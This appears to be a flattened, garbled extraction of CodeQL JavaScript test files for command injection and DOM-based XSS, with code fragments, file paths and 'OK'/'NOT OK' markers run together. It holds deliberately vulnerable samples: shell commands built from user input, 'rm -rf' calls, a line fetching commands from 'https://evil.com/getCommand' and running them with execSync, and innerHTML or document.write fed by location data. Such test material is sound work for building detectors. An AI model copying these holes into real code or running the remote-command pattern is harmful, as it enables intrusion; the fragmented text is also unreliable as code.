\n\t}\n});Object. ... ;\n\t}\n}){\n\tget: ... );\n\t}\n}get: fu ... e");\n\t}functio ... e");\n\t}{\n\t\tret ... e");\n\t}return  ... safe");boundPr ... "safe")boundProblem.bindfunctio ... _args\n}{\n\tthis ... _args\n}this.le ... rn_argsthis.learn_argsopts.learn_argsMyTrain ...  \n\t}\n};MyTrain ... ; \n\t}\n}MyTrainer.prototype{\n\ttrai ... ; \n\t}\n}train:  ... d); \n\t}functio ... d); \n\t}{\n\t\tvar ... d); \n\t}var com ...  model;command ... + model"learn  ... + model"learn  ... s + " ""learn  ... rn_argslearn cp.exec(command);cp.exec(command)module. ... rainer;module. ... Trainerfunctio ... sult;\n}{\n\tcons ... sult;\n}const s = str || '';s = str || ''str || ''let result = '';result = ''for (le ... \n\t\t}\n\t}i <= 2000{\n\t\tif  ... \n\t\t}\n\t}if (!(s ... i];\n\t\t}!(s[i]  ... == '"')(s[i] = ... == '"')s[i] == ... === '"'s[i] == ... === '`'s[i] == ... == '\''s[i] == ... == '\n's[i] == ... == '\t's[i] == ... == '\\'s[i] == ... === '#'s[i] == ... === ']'s[i] == ... === ')'s[i] == ... === '('s[i] == ... === '&'s[i] == ... === ';'s[i] == ... === '$'s[i] == ... === '\u02da's[i] == ... === '|'s[i] == ... === '['s[i] == ... === '?'s[i] == ... === '*'s[i] == ... === '<'s[i] == ... === '>'s[i] === undefineds[i]s[i] === '>'s[i] === '<'s[i] === '*'s[i] === '?'s[i] === '['s[i] === ']'s[i] === '|'s[i] === '\u02da''\u02da's[i] === '$'s[i] === ';'s[i] === '&'s[i] === '('s[i] === ')'s[i] === '#'s[i] === '\\'s[i] === '\t's[i] === '\n's[i] === '\''s[i] === '`'s[i] === '"'{\n\t\t\tre ... i];\n\t\t}result  ... + s[i];result  ...  + s[i]result + s[i]return result;module. ... itizer3sanitiz ... r(name)yetAnoh ... r(name)const s ... .spawn;spawn = cp.spawnmodule. ... ild`.\n}module. ... lOptionfunctio ... ild`.\n}{\n\tcp.e ... ild`.\n}cp.exec ... => {});cp.exec ...  => {}){shell: true}shell: true(err, out) => {}cp.spaw ... true});cp.spaw ...  true})cp.exec ... true});cp.exec ...  true})const S ...  true};SPAWN_O ... : true}spawn(" ... N_OPT);spawn(" ... WN_OPT)["first", name]var arr = [];arr = []arr.push(name);arr.push(name)arr.pushbuild(" ...  + '-')(name ? ... ) + '-'(name ? ... ' : '')name ?  ... :' : ''name + ':'functio ...  arr;\n}{\n\tvar  ...  arr;\n}if (som ... vert');something() === 'gm'gmarr.push('convert');arr.push('convert')convertfirst & ... first);first & ... (first)arr.push(first)last && ... (last);last && ... h(last)arr.push(last)return arr;var asy ... cute");asyncEx ... ecute")require ... ecute")async-executemodule. ... ncStuff{\n\tasyn ... OT OK\n}asyncEx ...  name);asyncEx ... + name)const m ... K\n\t}\n};myFuncs ... OK\n\t}\n}{\n\tmyFu ... OK\n\t}\n}myFunc: ... T OK\n\t}functio ... T OK\n\t}{\n\t\tasy ... T OK\n\t}module. ... y = {};module. ... ty = {}module. ... blabityObject. ... )\n\t)\n);Object. ... \t)\n\t)\n)Object. ... \n\t\t)\n\t)Object. ... \t{}\n\t\t)Object. ... .reduceObject. ... yFuncs)(props, ... },\n\t\t\t)[ key, value ]Object. ... },\n\t\t\t){\n\t\t\t\t\t ... ,\n\t\t\t\t}[key]:  ... \n\t\t\t\t\t}{\n\t\t\t\t\t ... \n\t\t\t\t\t}const { ... util');{promis ... 'util')require('util')const e ... .exec);exec =  ... ).exec)promisi ... ).exec)module. ... cmd);\n}{\n    c ... cmd);\n}const c ... y -v');cmd = p ... ry -v')path.jo ... ry -v')config.installedPathmyBinary -vreturn exec(cmd);exec(cmd)module. ... rgs);\n}module. ... tConcatfunctio ... rgs);\n}{\n\tlet  ... rgs);\n}let arg ... + name;args =  ...  + name' my na ...  + name my name is let cmd = 'echo';cmd = 'echo'echocp.exec(cmd + args);cp.exec(cmd + args)cmd + argsmodule. ... \n\t}\n});module. ... K\n\t}\n})module. ... Commandfunctio ... K\n\t}\n}){\n\tlet  ... cmd);\n}let cmd ... mand}`;cmd = ` ... mmand}``cd ${c ... mmand}`{\n\tvar  ... OK\n\t}\n}var MyT ... s')\n\t};MyThing ... ss')\n\t}{\n\t\tcp: ... ss')\n\t}cp: req ... ocess')module. ... T OK\n\t}module. ... ctThing{\n\t\tMyT ... T OK\n\t}MyThing ...  name);MyThing ... + name)MyThing.cp.execMyThing.cp/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/lib/lib2.js NOT OK - is imported from main module.// NOT  ... module.module. ... ule.\n};module. ... dule.\n}functio ... dule.\n}{\n\tcp.e ... dule.\n}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/lib/other.js OK, is not exported to a main-module. // OK,  ... odule. module. ... le. \n};module. ... ule. \n}functio ... ule. \n}{\n\tcp.e ... ule. \n}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/lib/subLib/index.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/lib/subLib NOT OK - functions exported as part of a submodule are also flagged.// NOT  ... lagged. NOT OK - this is being called explicitly from child_process-test.js// NOT  ... test.jsmodule. ... ged.\n};module. ... gged.\n}functio ... gged.\n}{\n\tcp.e ... gged.\n}module. ... t.js\n};module. ... st.js\n}functio ... st.js\n}{\n\tcp.e ... st.js\n}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/lib/subLib/package.json{\n  "na ... x.js"\n}"0.0.7"0.0.7"./index.js"./index.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/lib/subLib2/compiled-file.ts/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/lib/subLib2 NOT OK - the "files" directory points to this file.// NOT  ... s file.exportexport  ... file.\n}functio ... file.\n}{\n    c ... file.\n}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/lib/subLib2/package.json{\n  "na ... "\n  ]\n}"my-sub-lib2"my-sub-lib2[\n    " ... le"\n  ]"special-file.js"special-file.js"compiled-file.js"compiled-file.js"compiled-file"compiled-file/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/lib/subLib2/special-file.jsmodule. ... ile.\n};module. ... file.\n}{\n\tcp.e ... file.\n}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/lib/subLib3/my-file.ts/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/lib/subLib3/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/lib/subLib3/package.json{\n  "na ... e.js"\n}"./my-file.js"./my-file.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/other.js"cross-spawn""execa"shellSync"cross-spawn-async""exec""exec-async""remote-exec"ssh2"ssh2"ClientSSH2Stream"ssh2-streams""foreground-child""opener""http://github.com/""http://github.com"var htt ... "url");require ... c(cmd);require ... nc(cmd)require ... ").syncrequire ... spawn")cross-spawnrequire ... l(cmd);require ... ll(cmd)require ... ).shellrequire("execa")execarequire ... ellSyncrequire ... t(cmd);require ... ut(cmd)require ... .stdoutrequire ... r(cmd);require ... rr(cmd)require ... .stderrrequire ... )(cmd);require ... ")(cmd)require ... async")cross-spawn-asyncrequire("exec")(cmd)require("exec")exec-asyncrequire ... , cmd);require ... t, cmd)require ... -exec")remote-execconst s ... ssh2");ssh2 =  ... "ssh2")require("ssh2")new ssh ... c(cmd);new ssh2().exec(cmd)new ssh2().execnew ssh2()new ssh ... ec(cmd)new ssh ... ().execnew ssh2.Client()ssh2.Clientconst S ... Stream;SSH2Str ... 2Streamrequire ... 2Streamrequire ... reams")ssh2-streamsnew SSH ... , cmd);new SSH ... e, cmd)new SSH ... ().execnew SSH2Stream()require ... e(cmd);require ... de(cmd)require ... ").noderequire ... child")foreground-childconst o ... ener");opener  ... pener")require("opener")opener( ... .user);opener( ... y.user)"http:/ ... ry.userhttp://github.com/http://githuburl.par ... ry.useropener( ... cmd });opener( ...  cmd })http://github.com{ command: cmd }command: cmd/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/package.json{\n  "na ... b.js"\n}"myLib"myLib"./lib/lib.js"./lib/lib.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/third-party-command-injection.js"https""https://evil.com/getCommand"let htt ... cess");https = ... https")require("https")https.g ...   })\n);https.g ...    })\n)"https: ... ommand"https://evil.com/getCommandhttps://evilcom/getCommandres =>\n ... \n    })res.on( ... \n    })res.oncommand ... ;\n    }cp.execSync(command)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/tst_shell-command-injection-from-environment.js GOOD// GOOD'rm''-rf'"temp"'rm -rf 'var cp  ... xeca");execa = ... execa")cp.exec ... mp")]);cp.exec ... emp")])['-rf', ... temp")]path.jo ... "temp")tempcp.exec ... emp"));cp.exec ... temp"))'rm -rf ... "temp")execa.s ... emp"));execa.s ... temp"))execa.shellexeca.shellSyncconst s ... + "\"";safe =  ...  + "\"""\"" +  ...  + "\"""\"" +  ... "temp")execa.s ...  safe);execa.s ... + safe)'rm -rf ' + safe/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/uselesscat.js OK - pipes!// OK - pipes! OK multiple files.// OK m ...  files. OK - pipes// OK - pipes OK - non trivial options// OK - ... options OK - wildcard and pipes// OK - ... d pipes NOT OK ("encoding" is used EXACTLY the same way in fs.readFileSync)// NOT  ... leSync) OK (fs.readFileSync cannot emulate uid / gid))// OK ( ... / gid)) OK  - but flagged - not just a simple file read [INCONSISTENCY]// OK   ... STENCY] NOT OK - but not flagged [INCONSISTENCY] Not using stderr// Not using stderr OK. - stderr is used.// OK.  ... s used. OK - not a call to cat// OK - ...  to cat OK - unknown options.// OK - ... ptions. OK - Not a call to cat OK - contains &// OK - contains & OK - contains ,// OK - contains , OK - contains $// OK - contains $ OK - contains `// OK - contains ` OK - Non trivial use. (But weird API use.)// OK - ... I use.) OK - non trivial use.// OK - ... al use. OK - non-trivial use of returned proccess.// OK - ... occess. OK  // OK  "cat foo/bar""cat /proc/""/status"'cat /proc/cpuinfo'cat 'cat package.json | wc -l''cat /proc/cpuinfo /foo/bar' /foo/bar | grep foo1000'cat *.js | wc -l'cat foo/bar/'utf8'"/bin/cat /proc/cpuinfo"'cat /proc/cpuinfo > foo/bar/baz' > destpathoutFile"cat /proc/cpuinfo | grep name" | othertoolcat'cat '"sh -c 'cat "'/bin/cat''pom.xml'anOptsFileNameThatIsTooLongToBePrintedByToString'someEncodingValueThatIsCompletelyBogusAndTooLongForToString'"foo/"foo/bar/'node'doSomethingWithunknownOptions"node foo/bar""cat foo/bar&""cat foo/bar,""cat foo/bar$""cat foo/bar`"'cat''pipe'deadnotDeadsomeCallstdout2'cat /etc/dnsmasq.conf'"cat"shelljs"shelljs"cspawn'cross-spawn''foo/bar'myResultexecmod'exec'var chi ... cess');child_p ... ocess')var exe ... ecSync;execSyn ... xecSyncvar exe ... s.exec;exec =  ... ss.execvar spa ... .spawn;spawn = ... s.spawnvar spa ... wnSync;spawnSy ... awnSyncexec("c ... t) {});exec("c ... ut) {})cat foo/barfunctio ... out) {}exec("c ... t);\n});exec("c ... ut);\n})"cat /p ... status""cat /proc/" + idcat /proc//statusfunctio ... out);\n}{ // NO ... out);\n}console.log(out);console.log(out)execSyn ... ring();execSyn ... tring()execSyn ... oStringexecSyn ... uinfo')cat /proc/cpuinfoexecSyn ... path}`)`cat ${newpath}`execSyn ... c -l');execSyn ... wc -l')'cat pa ...  wc -l'cat package.json | wc -lcat package.json cat packagejson  wc -lexecSyn ... o/bar')'cat /p ... oo/bar'cat /proc/cpuinfo /foo/barexecSyn ... o/bar`)`cat ${ ... oo/bar`exec(`c ... t) { })`cat ${ ... ep foo`functio ... ut) { }execSyn ...  1000}){uid: 1000}uid: 1000exec('c ... ) { });exec('c ... t) { })cat *.js | wc -lcat *.js  *js { cwd: './' }cwd: './'execSyn ... ath}`);`cat fo ... wpath}`execSyn ... tf8'});execSyn ... utf8'}){encoding: 'utf8'}encoding: 'utf8'utf8"/bin/c ... puinfo"/bin/cat /proc/cpuinfo{ uid:  ... 'utf8'}gid: 1000execSyn ... r/baz')'cat /p ... ar/baz'cat /proc/cpuinfo > foo/bar/baz`cat ${ ... tpath}`execSyn ... ile}`);execSyn ... File}`)`cat ${ ... tFile}`files.join(' ')files.joinexecSyn ...  ')}`);execSyn ... ' ')}`)`cat ${ ... (' ')}`exec("c ... name");exec("c ...  name")"cat /p ... p name"cat /proc/cpuinfo | grep namecat /proc/cpuinfo  grep nameexecSyn ... ool}`);execSyn ... tool}`)`cat ${ ... rtool}`{\n\tretu ... OT OK\n}return  ... ring();execSyn ... + file)'cat ' + fileexecSyn ... + "'");execSyn ...  + "'")"sh -c  ... h + "'""sh -c  ... newpathsh -c 'cat var exe ... ecFile;execFil ... xecFilevar exe ... leSync;execFil ... ileSyncexecFil ... t);\n});execFil ... ut);\n})/bin/cat[ 'pom.xml' ]pom.xmlpomconsole.log(stdout);console.log(stdout)execFil ... ); \n});execFil ... r); \n})functio ... rr); \n}{ // OK ... rr); \n}console.log(stderr);console.log(stderr)execFil ... tf8'});execFil ... utf8'})execFil ... ml' ]);execFil ... xml' ])var opt ... utf8'};opts =  ... 'utf8'}execFil ...  opts);execFil ...   opts)var anO ... utf8'};anOptsF ... 'utf8'}anOptsF ... oStringexecFil ... tring);execFil ... String)execFil ... ing'});execFil ... ring'}){encodi ... tring'}encodin ... String''someEn ... String'someEncodingValueThatIsCompletelyBogusAndTooLongForToString[ "foo/ ... "bar" ]"foo/"  ... + "bar""foo/" + newPathexecSyn ...  + foo)'cat /p ... ' + fooexecFil ... h}` ]);execFil ... th}` ])[ `foo/ ... ath}` ]`foo/bar/${newpath}`exec("c ... out)});exec("c ... (out)})(err, o ... g(out)}{console.log(out)}exec("c ... (out));exec("c ... h(out))(err, o ... th(out)doSomethingWith(out)execFil ... tions);execFil ... ptions)exec("n ... (out));exec("n ... h(out))node foo/barexecFil ... at` ]);execFil ... cat` ])[ `cat` ]`cat`cat foo/bar&cat foo/bar,cat foo/bar$cat foo/bar`spawn(' ... t'] });spawn(' ... it'] }){ stdio ... rit'] }stdio:  ... herit']['pipe' ... herit'](functi ... ;\n})();(functi ... );\n})()(functi ... ());\n})functio ... d());\n}{\n  con ... d());\n}const c ... name]);cat = s ... ename])spawn(' ... ename])[filename]cat.std ... ;\n  });cat.std ... );\n  })cat.stdout.oncat.stdout(data)  ... a);\n  }{\n    r ... a);\n  }res.write(data);res.write(data)cat.std ... end());cat.std ... .end())() => res.end()res.end()res.endvar dea ... out)});dead =  ... (out)})var not ... out)});notDead ... (out)})console ... tDead);console.log(notDead)(functi ... .\n})();(functi ... s.\n})()(functi ... ess.\n})functio ... cess.\n}{\n  var ... cess.\n}someCal ... s.\n  );someCal ... ss.\n  )return  ... out)});const s ... f8'\n});stdout2 ... tf8'\n})execSyn ... tf8'\n})'cat /e ... q.conf'cat /etc/dnsmasq.confcat /etc/dnsmasqconf{ // NO ... utf8'\n}exec('/ ... s) {});exec('/ ...  s) {})function (e, s) {}spawn("cat")var she ... lljs");shelljs ... elljs")require("shelljs")shelljs ... out)});shelljs ... (out)})shelljs.execshelljs ... tf8'});shelljs ... utf8'})let csp ... pawn');cspawn  ... spawn')require ... spawn')cspawn( ... f8' });cspawn( ... tf8' })['foo/bar']foo/bar{ encoding: 'utf8' }cspawn( ... out)});cspawn( ... (out)})cspawn( ... bar']);cspawn( ... /bar'])let myR ... bar']);myResul ... /bar'])cspawn. ... /bar'])cspawn.synclet myR ... f8' });myResul ... tf8' })cspawn. ... tf8' })var exe ... exec');execmod ... 'exec')require('exec')execmod ... out)});execmod ... (out)})execmod ... tf8'});execmod ... utf8'})/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/addEventListener.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079"message"'items'this.ad ... T OK\n})this.ad ... istener{\n    d ... OT OK\n}documen ... .data);documen ... t.data)document.writeevent.data{data}documen ... (data);document.write(data)functio ... '}));\n}{\n    f ... '}));\n}functio ... K\n    }documen ... x.data)x.datadocumen ... y.data)y.datawindow. ... ms'}));window. ... ems'}))window. ... istenerfoo.bin ... tems'})foo.bind{data: 'items'}data: 'items'/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/angular2-client.ts NOT OK - though depends on route config// NOT  ...  configComponentOnInitDomSanitizerDomSanitizer2'@angular/core'getDOM'@angular/common'ActivatedRouteActivatedRouteSnapshot'@angular/router''@angular/platform-browser''app-root''./app.component.html'styleUrls'./app.component.css'AppComponent'my-app'routengOnInitbypassSecurityTrustHtmlgetLocationsnapshotqueryParamsfragmentparamMapqueryParamMapparametersparameterMapsomeMethodrouteSnapshotimport  ... /core';@angular/coreDomSani ... itizer2import  ... ommon';@angular/common\u0275getDOMimport  ... outer';@angular/routerActivat ... napshotimport  ... owser';'@angul ... rowser'@angular/platform-browserexport  ... K\n  }\n}class A ... K\n  }\n}@Compon ... ss']\n})Compone ... ss']\n}){\n  sel ... css']\n}selector: 'app-root'app-roottemplat ... t.html''./app. ... t.html'./app.component.html/appcomponentstyleUr ... t.css']['./app ... t.css']'./app. ... nt.css'./app.component.csstitle = 'my-app';my-appconstru ... \n  ) {}ngOnIni ...  OK\n  }this.sa ... .href);this.sa ... ).href)this.sa ... ustHtmlthis.sanitizerbypassS ... ustHtml\u0275getDOM ... ().href\u0275getDOM ... ation()\u0275getDOM ... ocation\u0275getDOM()this.sa ... s.foo);this.sa ... ms.foo)this.ro ... ams.foothis.ro ... .paramsthis.route.snapshotthis.routethis.ro ... yParamsthis.sa ... gment);this.sa ... agment)this.ro ... ragmentthis.sa ... foo'));this.sa ... 'foo'))this.ro ... ('foo')this.ro ... Map.getthis.ro ... aramMapthis.ro ...     });this.ro ... \n    })this.ro ... bscribethis.route.paramMapmap =>  ... K\n    }map.get('foo')map.getthis.sa ... .path);this.sa ... ].path)this.ro ... 1].paththis.ro ... .url[1]this.ro ... hot.urlthis.sa ... ers.x);this.sa ... ters.x)this.ro ... eters.xthis.ro ... ametersthis.sa ... ('x'));this.sa ... t('x'))this.ro ... et('x')this.ro ... eterMapthis.sa ... ams.x);this.sa ... rams.x)this.ro ... arams.xthis.sa ... r.url);this.sa ... er.url)this.router.urlthis.routerthis.sanitizer2someMet ...  OK\n  }routeSn ... ('foo')routeSn ... Map.getrouteSn ... aramMapprivate ... edRouteprivate ... nitizerprivate ...  Routerprivate ... itizer2/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/classnames.js'classnames'classNamesD'classnames/dedupe'classNamesB'classnames/bind'clsx'clsx'<span class="">Hello<span>unsafeStylesafeStyleimport  ... names';classnamesimport  ... edupe';classnames/dedupeimport  ... /bind';classnames/bindimport  ... 'clsx';documen ... span>`;documen ... <span>`documen ... nerHTMLdocument.body`<span  ... <span>`classNa ... w.name)let uns ... name});unsafeS ... .name})classNa ... .name})classNames.bind{foo: window.name}foo: window.nameunsafeStyle('foo')let saf ... nd({});safeSty ... ind({})classNames.bind({})safeSty ... w.name)safeStyle('foo')clsx(window.name)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/clipboard.ts NOT OK    // NOT OK    "#foo""paste"paste'text/plain''text/html'div'div'el'paste'"#id"$("#foo ... paste);$("#foo ...  paste)$("#foo").on$("#foo")#foofunctio ... div);\n}{\n    c ... div);\n}const { ... lEvent;{ clipb ... alEvent{ clipboardData }e.originalEventif (!cl ... return;!clipboardDataconst t ... lain');text =  ... plain')clipboa ... plain')clipboa ... getDatatext/plainconst h ... html');html =  ... /html')clipboa ... /html')text/htmlif (!te ... return;!text && !html!text!htmle.preventDefault();e.preventDefault()e.preventDefaultconst d ... 'div');div = d ... ('div')documen ... ('div')documen ... Elementif (htm ... ;\n    }div.inn ... = html;div.innerHTML = htmldiv.innerHTMLdiv.tex ... = text;div.tex ...  = textdiv.textContentdocumen ... d(div);documen ... nd(div)document.body.appendexport  ...    })\n}functio ...    })\n}{\n    e ...    })\n}el.addE ... \n    })el.addEventListener(e) =>  ...  \n    }{\n      ...  \n    }$("#id" ... tml'));$("#id" ... html'))$("#id").html$("#id")#ide.clipb ... /html')e.clipb ... getDatae.clipboardDatadocumen ...  OK\n});documen ... T OK\n})documen ... istener(e) =>  ... OT OK\n}{\n    $ ... OT OK\n}$("#foo ...  OK\n});$("#foo ... T OK\n})$("#foo").binde.origi ... /html')e.origi ... getDatae.origi ... ardData/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/d3.jsd3'd3'getTaintdoSomething'#main''width'100'color''red'otherFunction'bar'const d ... ('d3');d3 = require('d3')require('d3')functio ... name;\n}{\n    r ... name;\n}return window.name;d3.sele ... int());d3.sele ... aint())d3.sele ...   .htmld3.sele ... nction)d3.sele ...   .calld3.sele ...  'red')d3.sele ...  .styled3.sele ... ', 100)d3.sele ...   .attrd3.select('#main')d3.select#maingetTaint()d => getTaint(){\n    s ... OT OK\n}selecti ... int());selecti ... aint())selecti ...   .htmlselecti ...  'bar')selecti ...   .attr/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/dates.js OK - time arg is safe// OK - ... is safedateFns'date-fns'dateFnsFp'date-fns/fp'dateFnsEsm'date-fns/esm'moment'moment'dateformat'dateformat'taintTime is dayjs'dayjs'LuxonAdapter"@date-io/luxon"DateFnsAdapter"@date-io/date-fns"MomentAdapter"@date-io/moment"DayJSAdapter"@date-io/dayjs"dateioluxonformatByStringDateTime"luxon"yearstoFormatsetLocale'fr'fromISO"2020-01-01"startOf'day'dateio2addDays"2020-06-21"endOfDayimport  ... e-fns';date-fnsimport  ... ns/fp';date-fns/fpimport  ... s/esm';date-fns/esmimport  ... oment';import  ... ormat';let tim ... Date();time = new Date()new Date()let tai ... ng(1));taint = ... ing(1))decodeU ... ing(1))window. ... ring(1)window. ... bstringwindow.location.hashwindow.locationdocumen ... int)}`;documen ... aint)}``Time i ... aint)}`dateFns ...  taint)dateFns.formatdateFnsEsm.formatdocumen ... ime)}`;documen ... time)}``Time i ... time)}`dateFns ... )(time)dateFns ... (taint)dateFnsFp.formatdateFns ... , time)dateFns ... t(time)moment( ... (taint)moment(time).formatmoment(time)documen ... at()}`;documen ... mat()}``Time i ... mat()}`moment( ... ormat()moment(taint).formatmoment(taint)datefor ...  taint)import  ... dayjs';dayjs(t ... (taint)dayjs(time).formatdayjs(time)import  ... luxon";@date-io/luxonimport  ... e-fns";@date-io/date-fnsimport  ... oment";@date-io/momentimport  ... /dayjs"@date-io/dayjsconst d ... pter();dateFns ... apter()new DateFnsAdapter()const l ... pter();luxon = ... apter()new LuxonAdapter()const m ... pter();moment  ... apter()new MomentAdapter()dayjs = ... apter()new DayJSAdapter()dateFns ... yStringluxon.f ...  taint)luxon.formatByStringluxon.date()luxon.datemoment. ...  taint)moment. ... yStringmoment.date()moment.datedayjs.f ...  taint)dayjs.formatByStringdayjs.date()dayjs.dateDateTim ... (taint)DateTim ... oFormatDateTim ... rs: 1})DateTime.now().plusDateTime.now()DateTime.now{years: 1}years: 1new Dat ... (taint)new Dat ... oFormatnew Dat ... e('fr')new Dat ... tLocalenew DateTime()frDateTim ... ('day')DateTim ... startOfDateTim ... 01-01")DateTime.fromISO2020-01-01moment. ... (taint)moment. ... .formatmoment. ... 1"), 1)moment.addDaysmoment. ... 06-21")2020-06-21luxon.e ... (taint)luxon.e ... oFormatluxon.e ... date())luxon.endOfDaydayjs.s ... (taint)dayjs.s ... .formatdayjs.s ... e(), 4)dayjs.setHours/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/encodeuri.js'<a href="''">click</a>'let loc ... n.href;loc = w ... on.hrefwindow.location.href$('<a h ... </a>');$('<a h ... k</a>')'<a hre ... ck</a>''<a hre ... nt(loc)<a href="encodeU ... nt(loc)">click</a>/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/event-handler-receiver.js'my-id''<h2><a href="''">A link</a></h2>'documen ... T OK\n};documen ... OT OK\n}documen ... onclickdocumen ... my-id')documen ... entByIdmy-id{\n  thi ... OT OK\n}this.pa ... </h2>';this.pa ... ></h2>'this.pa ... nerHTMLthis.parentNode'<h2><a ... ></h2>''<h2><a ... on.href<h2><a href="location.href">A link</a></h2>/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/express.jsJSDOM"jsdom""wobble"runScripts"dangerously""outside-only"import  ... jsdom";jsdomfunctio ... " });\n}{\n    / ... " });\n}new JSD ... ly" });new JSD ... sly" })req.param("wobble")wobble{ runSc ... usly" }runScri ... rously"dangerouslynew JSD ... nly" }){ runSc ... only" }runScri ... e-only"outside-only/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/externs.js Adapted from the Google Closure externs; original copyright header included below.// Adap ...  below.
 * Stub for the DOM hierarchy.
 *
 * @constructor
 * @extends {EventTarget}
 
 * @type {!DomObjectStub}
 /**\n *  ... ub}\n */
 * @return {DomObjectStub}
 DomObjectStubStub for the DOM hierarchy.!DomObjectStubfunctio ... ub() {}DomObje ... e.body;DomObje ... pe.bodyDomObje ... ototypeDomObje ... .value;DomObje ... e.valueDomObje ... n() {};DomObje ... on() {}DomObje ... sertRowDomObje ... ertCell/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/jquery.js OK - location.search starts with '?'// OK - ... ith '?' OK - location.hash starts with '#'// OK - ... ith '#' Not related to jQuery, but the handling of $() should not affect this sink// Not  ... is sink OK - start with '#' OK - does not start with '<'// OK - ... ith '<'"body""<div id=\"""\">""XSS: ""<b>""</b>"elm'!''blah''<b>''</b>'var tai ... .searchtainted ... .searchdocumen ... .searchdocument.location$(tainted);$(tainted)$("body", tainted);$("body", tainted)$("." + tainted);$("." + tainted)"." + tainted$("<div ... "\">");$("<div ...  "\">")"<div i ... + "\">""<div i ... tainted<div id="">$("body ... inted);$("body ... ainted)$("body").html$("body")"XSS: " + taintedXSS: $(windo ... .hash);$(windo ... n.hash)$("<b>" ... </b>");$("<b>" ... "</b>")"<b>" + ...  "</b>""<b>" + ... tring()<b>location.toString()location.toString</b>let elm ... d('x');elm = d ... Id('x')documen ... Id('x')elm.inn ... .hash);elm.inn ... n.hash)elm.innerHTMLdecodeU ... n.hash)elm.inn ... earch);elm.inn ... search)decodeU ... search)window. ... .searchelm.inn ... ing());elm.inn ... ring())decodeU ... ring())window. ... tring()window. ... oStringlet has ... n.hash;hash =  ... on.hash$(hash);$(hash)$(hash. ... ng(1));$(hash.substring(1))hash.substring(1)hash.substring$(hash. ... , 10));$(hash. ... 1, 10))hash.su ... (1, 10)$(hash.substr(1));$(hash.substr(1))hash.substr(1)hash.substr$(hash.slice(1));$(hash.slice(1))hash.slice(1)hash.slice$(hash. ... 0, 10))hash.su ... (0, 10)$(hash. ... , ''));$(hash. ... ', ''))hash.re ... #', '')hash.replace$(windo ... , ''));$(windo ... ', ''))window. ... ?', '')window. ... replacehash.re ... !', '')hash.re ... h', '')blah$(hash + 'blah');$(hash + 'blah')hash + 'blah'$('blah' + hash);$('blah' + hash)'blah' + hash$('<b>' ... </b>');$('<b>' ... '</b>')'<b>' + ...  '</b>''<b>' + hash/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/jwt-server.jsjwt"jsonwebtoken"'my-secret-key'decodedimport  ... token";jsonwebtoken{\n    v ...   });\n}var tai ... bble");taint = ... obble")jwt.ver ...     });jwt.ver ... \n    })jwt.verifymy-secret-keydecoded.foo/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/jwt.js NOT OK - but only flagged with additional sources [INCONSISTENCY]jwt_decode"jwt-decode""jquery"loginUrljGrowlimport  ... ecode";jwt-decodeimport  ... jquery"$.post( ... CY]\n});$.post( ... NCY]\n})$.postloginUrl(){data: "foo"}data: "foo"(data,  ... ENCY]\n}{\n    v ... ENCY]\n}var dec ... (data);decoded ... e(data)jwt_decode(data)$.jGrowl(decoded);$.jGrowl(decoded)$.jGrowl/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/nodemailer.jsnodemailer'nodemailer'backend'./backend''/private_message'createTransportsendMail'webmaster@example.com'getUserEmail'Private message'Hi, you got a message from someone. let nod ... iler');nodemai ... ailer')require ... 